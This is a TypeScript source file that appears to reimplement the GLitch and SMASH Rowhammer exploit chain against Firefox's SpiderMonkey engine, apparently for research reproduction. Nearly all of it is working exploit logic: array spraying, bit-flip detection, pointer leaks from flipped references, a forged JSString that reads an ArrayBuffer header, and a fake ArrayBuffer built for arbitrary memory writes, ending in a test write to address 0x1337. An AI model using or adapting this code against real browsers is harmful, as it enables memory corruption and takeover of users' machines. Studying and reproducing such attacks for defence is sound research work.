/*
 * This code reimplements the end-to-end exploit from the GLitch paper
 *
 * (GLitch) Grand Pwning Unit: Accelerating Microarchitectural Attacks with the
 * GPU
 *
 *  - Paper: https://ieeexplore.ieee.org/document/8418604
 *  - Video: https://www.youtube.com/watch?v=0WmbNDApQWE
 *  - Code: see email from Pietro
 *
 * SMASH: Synchronized Many-Sided Rowhammer Attacks From JavaScript
 *  - Paper: https://www.usenix.org/system/files/sec21-de-ridder.pdf
 */

/*** The lower 47b of an NaN-boxed pointer are the pointer's target address. */
const JSVAL_TAG_SHIFT = 47;
const ARRAYBUFFER_HEADER_SZ_BYTES = 7 * 8; /* Was 64 before!? */

/* 10360000 is for 10. 120 gives good reuse and lowers the risk of corruption */
const ARRAY_SIZE_MULTIPLIER = 120;
const SPRAY = Math.round(103600000 / ARRAY_SIZE_MULTIPLIER);

/*
 * GLitch uses JSVAL_TAG_CLEAR = 0xFFFFFF80 and JSVAL_TYPE_STRING = 0x06 to
 * construct TAG as (JSVAL_TAG_CLEAR | JSVAL_TYPE_STRING) in 32-bit
 * SpiderMonkey.  See
 * https://searchfox.org/mozilla-central/source/js/public/Value.h#207.
 */
const JSVAL_TAG_DOUBLE = 0x1fff0; // 17b
const JSVAL_TYPE_STRING = 0x06;
const JSVAL_TYPE_OBJ = 0x0c;

const JSVAL_STRING_TAG = JSVAL_TAG_DOUBLE | JSVAL_TYPE_STRING;
const JSVAL_OBJ_TAG = JSVAL_TAG_DOUBLE | JSVAL_TYPE_OBJ;

const indent = "    ";

/* Also used in posthammer.ts */
const EXPLOITABLE_MASK32 = 0xfff80000;

/**
 * Converts a number to a 64-bit floating point representation (IEEE754) and
 * returns it as a binary string.
 * Credits to Max Koretskyi (https://stackoverflow.com/a/37092416/3017719).
 *
 * @param number - The number to convert.
 * @returns The 64-bit floating point representation as a string.
 */
function numberToFloat64Bin(number: number): string {
  if (typeof number !== "number") {
    return "";
  }

  var f = new Float64Array(1);
  f[0] = number;
  var view = new Uint8Array(f.buffer);
  var i: number,
    result = "";
  for (i = view.length - 1; i >= 0; i--) {
    var bits = view[i].toString(2);
    if (bits.length < 8) {
      bits = new Array(8 - bits.length).fill("0").join("") + bits;
    }
    result += bits;
  }
  return result;
}

/**
 * Extracts a range of bits from a binary string and returns the decimal value.
 *
 * @param value - The binary string from which to extract the bits.
 * @param startIdx - The starting index of the range (inclusive).
 * @param endIdx - The ending index of the range (exclusive).
 * @returns The decimal value of the extracted bits.
 */
function extractBits(
  value: string,
  startIdx: number,
  endIdx: number,
  padBits = 0,
) {
  return parseInt(
    value
      .split("")
      .reverse()
      .slice(startIdx, endIdx)
      .reverse()
      .join("")
      .padStart(padBits, "0"),
    2,
  );
}

/**
 * Converts a binary string representation of a 64-bit IEEE 754 floating-point
 * number to a JavaScript number.
 *
 * @param bin - The binary string representation of the number.
 * @returns The converted floating-point number.
 */
function float64BinToNumber(bin: string): number {
  const buffer = new ArrayBuffer(8);
  const view = new DataView(buffer);
  // This is needed as we need to write the bytes in reverse order.
  let targetBlockStart = 64;
  // Convert the binary string to an array of bits.
  const bits = bin.split("");
  for (let i = 0; i < 64; i += 8) {
    // Take a byte from the input and make a single string out of it.
    const byte = bits.slice(i, i + 8).join("");
    // Write the byte to the buffer.
    view.setUint8(targetBlockStart / 8 - 1, parseInt(byte, 2));
    // Move to the next byte.
    targetBlockStart -= 8;
  }
  return view.getFloat64(0, true);
}

function hex(u32: number) {
  return "0x" + u32.toString(16).padStart(8, "0");
}

/**
 * Translates the unicode-encoded (leaked) header of the ArrayBuffer
 */
function unicode_to_hex(u: string): string[] {
  var res = [];
  for (let i = 0; i < u.length; i += 2) {
    var temp1 = u.charCodeAt(i + 1) << 16;
    var reso = (u.charCodeAt(i) | temp1) >>> 0;
    res.push(reso);
  }
  return res.map((a) => {
    return a.toString(16).padStart(2, "0");
  });
}

function hexToBytes(hex) {
  let bytes = new Array<number>();
  for (let c = 0; c < hex.length; c += 2)
    bytes.push(parseInt(hex.substring(c, c + 2), 16));
  return bytes;
}

/**
 * Prints the leaked ArrayBuffer header. This header is then used to create a
 * fake nested ArrayBuffer.
 *
 * @param header - The leaked ArrayBuffer header.
 * @param lengthBytes - The number of bytes to print (normally 64B)
 */
function printArrayBufferHeader(header: string, lengthBytes: number) {
  if (typeof header === "string") {
    for (let i = 0; i < lengthBytes; i++) {
      let out = `0x${(4 * i).toString(16).padStart(3, "0")}:  `;
      for (let j = 7; j >= 0; j--) {
        out += unicode_to_hex(header[i * 8 + j]);
        if (j % 2 == 0) {
          out += " ";
        }
      }
      console.log(out);
    }
  }
}

/**
 * Writes the fake JSString that points to the ArrayBuffer
 */
function writeFakeJSStringObject(
  startOffset: number,
  sizeBytes: number,
  dataPtr: string,
  view: DataView,
) {
  let bytesWritten = 0;

  assert(dataPtr.length === JSVAL_TAG_SHIFT);

  dataPtr = "00000000" + "00000000" + "0" + dataPtr;

  assert(dataPtr.length === 64);

  print("writing string...");

  /* Flags (4): 00000418 also worked, is the value we got in a test */
  view.setUint32(startOffset, 0x00000230, true);

  /* Size (4) */
  view.setUint32(startOffset + 4, sizeBytes, true);

  /* Pointer (8): +8 is high, so we write low there, little endian */
  view.setUint32(startOffset + 8, extractBits(dataPtr, 0, 32), true);
  view.setUint32(startOffset + 12, extractBits(dataPtr, 32, 64), true);

  print("wrote string");

  return 4 + 4 + 8;
}

/**
 * Converts a number to a hexadecimal string representation of a 64-bit
 * floating-point number.
 *
 * @param nbr - The number to convert.
 * @returns The hexadecimal string representation of the 64-bit floating-point
 * number.
 */
function numberToFloat64Hex(nbr: number): string {
  let bin = numberToFloat64Bin(nbr);
  if (bin === "") {
    return "";
  }
  return `0x${binStringToHex(bin)}`;
}

function genDoublePointer(
  ptr: number,
  tag: number,
  zeroOneMask: number,
): number {
  assert(zeroOneMask <= 0x8000 && zeroOneMask >= 0x8);
  assert(ptr <= Number.MAX_SAFE_INTEGER);

  /* The mask assumes the 0xfff8 part of the tag */
  let tagFlipped = ((tag >>> 0) ^ (zeroOneMask << 1)) >>> 0;

  console.log(`tag         = ${tag.toString(2)} (0x${tag.toString(16)})`);
  console.log(
    `tag flipped = ${tagFlipped.toString(2)} (0x${tagFlipped.toString(16)})`,
  );

  let dbl =
    tagFlipped.toString(2).padStart(64 - JSVAL_TAG_SHIFT, "0") +
    ptr.toString(2).padStart(JSVAL_TAG_SHIFT, "0");
  console.log("dbl = " + dbl);

  let result = binaryStringToFloat(dbl);
  console.log("result = " + result);
  console.log("result = " + numberToFloat64Hex(result));

  return result;
}

/**
 * Converts a binary string to a hexadecimal string.
 * This is necessary to do hex character-wise because .toString(16) does not
 * work correctly with large binary numbers.
 *
 * @param n1 - The binary string to convert.
 * @returns The hexadecimal string.
 * @throws Error if the binary string length is not a multiple of 4.
 */
function binStringToHex(n1: string): string {
  let hex = "";
  let arr = n1.split("");

  if (arr.length % 4 !== 0) {
    throw new Error(
      "Binary string length must be a multiple of 4 for binStringToHex.",
    );
  }

  let offt = 4; // to convert exactly four bits into one hex digit
  for (let i = 0; i < arr.length; i += offt) {
    hex += parseInt(arr.slice(i, i + offt).join(""), 2).toString(16);
  }

  return hex;
}

/**
 * Encodes a binary string into a IEEE754 floating-point number.
 *
 * @param binaryStr - The binary string to convert.
 */
function binaryStringToFloat(binaryStr: string): number {
  if (binaryStr.length !== 64) {
    throw new Error(
      `Binary string must be 64 bits long but is ${binaryStr.length}b.`,
    );
  }

  console.log(`binaryStr = ${binaryStr}`);

  // Extract sign bit (1 bit)
  let sign = binaryStr[0] === "1" ? -1 : 1;
  // console.log(`sign = ${sign}`);

  // Extract and convert exponent bits (11 bits)
  let exponentBits = binaryStr.split("").slice(1, 12).join("");
  // console.log(`exponentBits = ${exponentBits}`)
  let exponent = parseInt(exponentBits, 2) - 1023; // Exponent bias is 1023 for double precision

  // Extract fraction/mantissa bits (52 bits)
  let fractionBits = binaryStr.split("").slice(12, 64).join("");
  // console.log(`fractionBits = ${fractionBits}`);
  let fraction = 1; // The implicit leading bit (1 before the decimal point in normalized form)

  // Calculate the fraction value
  for (let i = 0; i < fractionBits.length; i++) {
    if (fractionBits[i] === "1") {
      fraction += Math.pow(2, -(i + 1));
    }
  }

  // Compute the final floating-point number
  return sign * Math.pow(2, exponent) * fraction;
}

/* Main function */
function buildPrimitive(
  hammer: (xors: number, refIters: number[], amp: number) => number,
  spec,
) {
  /* To detect what got reused (optional) */
  let exploitableArrays: number[][] = [];
  const magics = [-3.7206620809969885e-103, 1.1945305291614955e103];

  assert(spec.pretend || spec.preHammer);
  assert(spec.pretend || spec.postHammer);

  for (let i = 0; i < SPRAY; i++) {
    let array = new Array(ARRAY_SIZE_MULTIPLIER);
    array.fill(magics[0]);
    exploitableArrays.push(array);
  }

  print(
    "check your reuse (optional)...",
    magics[0],
    numberToFloat64Hex(magics[0]),
  );
  sleep(20);
  print("storing refs");

  /*
   * dummyInlinedArray will be inlined (header and data together) because it's
   * smaller than 96 bytes. First step is to extract its header, by flipping a
   * reference to it into a double. The double tells us where it is. Then:
   *
   * 1. Use the double to create a string that points to the header
   * 2. Create another double that points to this string
   * 3. Flip that last double to obtain a reference to the string
   * 4. Read the string (by accessing the reference) and obtain the header
   * 5. Use the header to create a fake ArrayObject (we overwrite our fake
   * string)
   */
  const inlinedSize = 80;

  var dummyInlinedArray = new ArrayBuffer(inlinedSize);
  let view = new DataView(dummyInlinedArray);

  /*
   * To verify the layout of a JSString:
   * let dummyString = "123214lkjasfdlkjasdflkjas";
   */

  /* NOTE: never use dummyInlinedArray.length! It's zero! */
  for (let i = 0; i < dummyInlinedArray.byteLength; i++) {
    view.setUint8(i, 0x41, true);
  }

  let targetElements: number[] = [];
  let hadFlips = { oneZero: false, zeroOne: false };

  if (!spec.pretend) {
    /* These are 0xaaaaa... and 0x55555.... respectively */
    for (const m of magics) {
      for (let i = 0; i < exploitableArrays.length; i++) {
        exploitableArrays[i].fill(m);
      }

      let warmup = 30;

      while (warmup) {
        print(
          `maps:flip-zero:${(1 << getRandomInt(3, 16))
            .toString(16)
            .padStart(4, "0")}:${m}:${numberToFloat64Hex(m)}`,
        );

        if (spec.pretend) {
          sleep(3);
        } else {
          print("pre...");
          spec.preHammer();
          print("hammer...");
          dummy[0] ^= hammer(spec.xors, spec.refIters, spec.amp);
          print("post...");
          spec.postHammer();
          print("check...");
        }

        for (let i = 0; i < exploitableArrays.length; i++) {
          if (!Array.isArray(exploitableArrays[i])) {
            /* Never happens, this is just game over!? */
            print(`array ${i} corrupt, skipping`);
            assert(0);
          }

          let array = exploitableArrays[i];

          for (let j = 0; j < array.length; j++) {
            if (typeof array[j] === "number") {
              /* Flip but not exploitable? */
              if (array[j] !== m) {
                /* NOTE: 64-bit values now! We take the upper 32... Cut 0x! */
                assert(numberToFloat64Hex(array[j]).length === 16 + 2);
                assert(numberToFloat64Hex(m).length === 16 + 2);

                let ys: number[] = [array[j], m].map(
                  (x) =>
                    parseInt(numberToFloat64Hex(x).slice(2, 2 + 8), 16) >>> 0,
                );

                let flip: number = (ys[0] ^ ys[1]) >>> 0;
                let str: string = `${array[j]}/${ys[0].toString(16)}/${ys[1].toString(16)}/${numberToFloat64Hex(array[j])}/${flip.toString(16)}`;

                if (flip & EXPLOITABLE_MASK32) {
                  print(
                    i,
                    j,
                    `got ${str}, which is exploitable (had ${m}), 0 -> 1?`,
                    ys[0] > ys[1],
                  );

                  /* Zero to one? */
                  if (ys[0] > ys[1]) {
                    /*
                     * Check if we have the same mask and otherwise update it
                     */
                    let __expect: number = flip >>> 16;
                    if (spec.zeroOneMask != __expect) {
                      print(
                        `expected mask ${spec.zeroOneMask.toString(16)} (2nd flip), but have ${__expect.toString(16)}, updating...`,
                      );
                      spec.zeroOneMask = __expect;
                    }

                    hadFlips.zeroOne = true;
                  } else {
                    hadFlips.oneZero = true;
                  }

                  targetElements.push([i, j, ys[0] > ys[1]]);

                  /* Quit early when we've seen enough */
                  if (
                    targetElements.length >= 2 &&
                    hadFlips.zeroOne &&
                    hadFlips.oneZero
                  ) {
                    /* Done! */
                    warmup = 1;
                  }
                } else {
                  print(i, j, `got ${str}, but expected ${m}`);
                }

                array[j] = m;
              }
            } else {
              /* Should not happen */
              print(`got type ${typeof array[j]}?!`);
              array[j] = m;
            }
          }
        }

        warmup--;
      }
    }
  }

  print("warmup complete, target elements:", targetElements);

  /* Initialize the array with references */
  for (const [i, j, zeroOne] of targetElements) {
    if (!zeroOne) {
      /* First flip */
      exploitableArrays[i][j] = dummyInlinedArray;
      assert(typeof exploitableArrays[i][j] !== "number");
    }
  }

  let flipOne: number[] = [];

  while (!flipOne.length) {
    print(
      `maps:flip-one:${(1 << getRandomInt(3, 16))
        .toString(16)
        .padStart(4, "0")}`,
    );

    if (spec.pretend) {
      sleep(3);
    } else {
      print("pre...");
      spec.preHammer();
      print("hammer...");
      dummy[0] ^= hammer(spec.xors, spec.refIters, spec.amp);
      print("post...");
      spec.postHammer();
      print("check...");
    }

    for (const [i, j, zeroOne] of targetElements) {
      if (!zeroOne) {
        let array = exploitableArrays[i];

        /*
         * Alternatives...
         *
         * if (!Array.isArray(array[j])) {
         * if (array[j].byteLength === undefined) {
         * if (array[j].constructor === Number) {
         * if (eval("typeof array[j] === 'number'")) {
         */
        if (typeof array[j] === "number") {
          print(
            "success! moving on",
            i,
            exploitableArrays.length,
            Math.round((100 * i) / exploitableArrays.length),
            "%",
            j,
            numberToFloat64Hex(array[j]),
            typeof array[j],
          );
          flipOne = [i, j];
          break;
        }
      }
    }
  }

  /*
   * Bit flipped (1->0) in outerArray[innerIdx] => it is now a readable double!
   * Extract pointer from double (i.e., the lower 48 bits). This pointer points
   * to dummyInlinedArray
   */
  let arr0float64to48bsub = numberToFloat64Bin(
    exploitableArrays[flipOne[0]][flipOne[1]],
  )
    .split("")
    .slice(-JSVAL_TAG_SHIFT)
    .join("");

  if (arr0float64to48bsub.length !== JSVAL_TAG_SHIFT) {
    throw new Error(
      `arr0float64to48bsub has invalid length (${arr0float64to48bsub.length})`,
    );
  }

  let ptr2dummyInlinedArray = parseInt(arr0float64to48bsub, 2);
  print(
    `\t*dummyInlinedArray: 0x${ptr2dummyInlinedArray.toString(16)} ${ptr2dummyInlinedArray} ${typeof ptr2dummyInlinedArray}`,
  );

  /*
   * Because we will be reading the header as a string, every two bytes of the
   * header become one character (UTF-16), hence the / 2
   */
  let fakeJSStringSz = writeFakeJSStringObject(
    0,
    ARRAYBUFFER_HEADER_SZ_BYTES / 2,
    arr0float64to48bsub,
    view,
  );

  print("wrote fake string");

  /*
   * We add 0x40 here (64 bytes) as the first element of dummyInlinedArray is
   * at offset 64 due to the ArrayBuffer's header. GLitch uses 0x30 (48 bytes)
   * instead
   *
   * This 13 is bit 60 that we will flip later, can also be a different one!?
   */
  let doublePointerToString = genDoublePointer(
    ptr2dummyInlinedArray + ARRAYBUFFER_HEADER_SZ_BYTES,
    JSVAL_STRING_TAG,
    spec.zeroOneMask,
  );

  print("generated the pointer (double) to it");

  for (const [i, j, zeroOne] of targetElements) {
    if (zeroOne) {
      /* 2nd */
      exploitableArrays[i][j] = doublePointerToString;
      assert(typeof exploitableArrays[i][j] === "number");
    }
  }

  print("stored it everywhere");

  /* Contents of the inlined array: should be the string now */
  print("flg: 0x" + view.getUint32(0, true).toString(16));
  print("len: 0x" + view.getUint32(4, true).toString(16));
  print("ptr: 0x" + view.getBigUint64(8, true).toString(16));
  print("rest... 0x" + view.getBigUint64(16, true).toString(16));

  let flipTwo: number = [];

  while (!flipTwo.length) {
    print(`maps:flip-two:${spec.zeroOneMask.toString(16).padStart(4, "0")}`);

    if (spec.pretend) {
      sleep(3);
    } else {
      print("pre...");
      spec.preHammer();
      print("hammer...");
      dummy[0] ^= hammer(spec.xors, spec.refIters, 10 * spec.amp);
      print("post...");
      spec.postHammer();
      print("check...");
    }

    for (const [i, j, zeroOne] of targetElements) {
      if (zeroOne) {
        if (typeof exploitableArrays[i][j] === "string") {
          flipTwo = [i, j];
          print("success!", i, j);
          break;
        }
      }
    }
  }

  /*
   * do {
   *   dummy[0] ^= hammer(spec.xors, spec.refIters, spec.amp);
   * } while (typeof outerArray[1] !== "string");
   */
  assert(typeof exploitableArrays[flipTwo[0]][flipTwo[1]] === "string");

  let bytes = exploitableArrays[flipTwo[0]][flipTwo[1]]
    .split("")
    .map((x) => x.charCodeAt(0));
  bytes = bytes.map((x) => [x & 0xff, (x >>> 8) & 0xff]).flat();

  assert(bytes.length % 8 === 0);
  assert(bytes.length == ARRAYBUFFER_HEADER_SZ_BYTES);

  function getLongAtOffset(bytes: number[], offset: number) {
    str = bytes
      .slice(offset, offset + 8)
      .map((x) => x.toString(16).padStart(2, "0"))
      .reverse()
      .join("");
    return str;
  }

  const __get32bits = (x: string, offsetInBytes: number) => {
    assert(offsetInBytes <= 4);
    return (
      parseInt(
        x.slice(2 * offsetInBytes, 2 * offsetInBytes + 8).padStart(8, "0"),
        16,
      ) >>> 0
    );
  };

  const __printBytes = (bytes: number[]) => {
    for (let i = 0; i < bytes.length; i++) {
      print(i, bytes[i], bytes[i].toString(16).padStart(2, "0"));
    }
  };

  function setLongAtOffset(bytes: number[], offset: number, str: string) {
    x = new Uint8Array(4);
    y = new DataView(x.buffer);

    /* These will be the lower, so they are the higher of str... */
    lower = __get32bits(str, 0);
    y.setUint32(0, lower, true);
    bytes.splice(offset + 4, 4, ...x);

    /* These will be the higher, so they are the lower of str... */
    higher = __get32bits(str, 4);
    y.setUint32(0, higher, true);
    bytes.splice(offset, 4, ...x);

    assert(getLongAtOffset(bytes, offset) === str);
  }

  for (let i = 0; i < bytes.length; i += 8) {
    print(
      i,
      bytes
        .slice(i, i + 8)
        .map((x) => x.toString(16).padStart(2, "0"))
        .reverse()
        .join(""),
      getLongAtOffset(bytes, i),
    );

    /* Testing... */
    setLongAtOffset(bytes, i, getLongAtOffset(bytes, i));
  }

  /* Crucial assertion: did we get the right header!? */
  assert(
    (ptr2dummyInlinedArray + ARRAYBUFFER_HEADER_SZ_BYTES)
      .toString(16)
      .padStart(16, "0") === getLongAtOffset(bytes, 3 * 8),
  );

  /* Change the pointer to read wherever we want to */
  let targetAddress: string = "0000000000001337";

  setLongAtOffset(bytes, 3 * 8, targetAddress);

  let doublePointerToArray = genDoublePointer(
    ptr2dummyInlinedArray + ARRAYBUFFER_HEADER_SZ_BYTES,
    JSVAL_OBJ_TAG,
    spec.zeroOneMask,
  );

  assert(typeof exploitableArrays[flipTwo[0]][flipTwo[1]] === "string");

  exploitableArrays[flipTwo[0]][flipTwo[1]] = doublePointerToArray;

  assert(typeof exploitableArrays[flipTwo[0]][flipTwo[1]] !== "string");

  print("overwriting string for fake buffer");

  for (let i = 0; i < bytes.length; i++) {
    view.setUint8(i, bytes[i]);
  }

  /*
   * 0->1 bit flip to craft pointer to fake ArrayBuffer.
   *
   * NOTE: here we can go hard on the hammer count! Times 100
   */
  while (!(exploitableArrays[flipTwo[0]][flipTwo[1]] instanceof ArrayBuffer)) {
    print(`maps:flip-three:${spec.zeroOneMask.toString(16).padStart(4, "0")}`);

    if (spec.pretend) {
      sleep(3);
    } else {
      print("pre...");
      spec.preHammer();
      print("hammer...");
      dummy[0] ^= hammer(spec.xors, spec.refIters, 10 * spec.amp);
      print("post...");
      spec.postHammer();
      print("check...");
    }
  }

  let craftedBuffer = new BigUint64Array(
    exploitableArrays[flipTwo[0]][flipTwo[1]],
  );

  assert(craftedBuffer.length === inlinedSize / 8);

  print("about to segfault at 0x1337...");
  craftedBuffer[0] = BigInt("0x41446327539");
}
